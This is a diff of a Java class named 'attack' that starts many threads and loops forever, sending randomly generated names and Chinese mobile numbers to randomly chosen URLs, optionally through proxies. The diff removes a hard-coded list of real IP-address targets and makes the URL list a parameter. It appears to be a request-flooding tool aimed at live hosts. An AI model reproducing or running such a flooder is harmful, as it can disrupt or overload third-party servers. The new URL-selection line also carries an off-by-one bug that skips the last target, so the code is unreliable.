@@ -12,7 +12,7 @@ import java.util.Random;
 
 public class attack implements Runnable {
     static String method;
-    static String url;
+    static String[] urls;
     static String param;
     static boolean genoutput = false;
     static boolean proxyswitch = false;
@@ -35,9 +35,9 @@ public class attack implements Runnable {
         }
     }
 
-    protected static void start(int thnum, String tmethod, String turl, String tparam) {
+    protected static void start(int thnum, String tmethod, String[] turl, String tparam) {
         method = tmethod;
-        url = turl;
+        urls = turl;
         param = tparam;
         for (int i = 0; i < thnum; i++) {
             new Thread(new attack()).start();
@@ -56,14 +56,6 @@ public class attack implements Runnable {
                 "130", "131", "132", "145", "155", "156", "166", "171", "175", "176", "185", "186", "166", // 中国联通
                 "133", "149", "153", "173", "177", "180", "181", "189", "199"// 中国电信
         };
-        // String[] urls = {
-        // "http://121.5.50.10/2018.php",
-        // "http://107.148.190.251/2018.php",
-        // "http://47.93.13.217/2018.php",
-        // "http://121.5.50.10/2018.php",
-        // "http://119.91.151.236/2018.php",
-        // "http://124.223.76.146/index.php",
-        // };
         // proxy
         String proxytype = "";
         String proxyurl = "";
@@ -103,7 +95,7 @@ public class attack implements Runnable {
         }
         while (true) {
             // url
-            // String url = urls[random.nextInt(urls.length)];
+            String url = urls[random.nextInt(urls.length - 1)].toString();
             // name
             String rn;
             Long brn = (long) (Math.random() * (99999999999l - 10000000)) + 1000000;
